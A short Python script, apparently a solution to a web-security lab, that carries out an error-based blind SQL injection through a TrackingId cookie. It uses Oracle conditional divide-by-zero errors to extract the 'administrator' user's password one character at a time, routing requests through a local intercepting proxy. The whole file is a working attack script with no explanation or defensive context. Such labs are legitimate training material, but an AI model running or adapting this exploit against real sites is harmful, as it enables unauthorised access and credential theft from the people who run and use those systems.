import sys
import requests
import urllib3
import urllib.parse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def sql_injection(url):
    password = ""
    for i in range(1,21):
        for j in range (48,123):
            sqli_payload = f"'||(SELECT CASE WHEN SUBSTR(password,{i},1)='{chr(j)}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
            tracking_id = "dummy_tracking_id_value"
            cookies = {"TrackingId":tracking_id + sqli_payload_encoded,'session':"dummy_session_value"}
            response = requests.get(url,cookies = cookies, verify = False, proxies = proxies)
            if response.status_code == 500:
                print(f"Found character: {chr(j)} at position {i}")
                password += chr(j)
                break
    print(f"Password found: {password}")
               
def main():
    if len(sys.argv) !=2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    url = sys.argv[1]
    print("(+) Retreiving administrator password...")
    sql_injection(url)  

if __name__ == "__main__":
    main()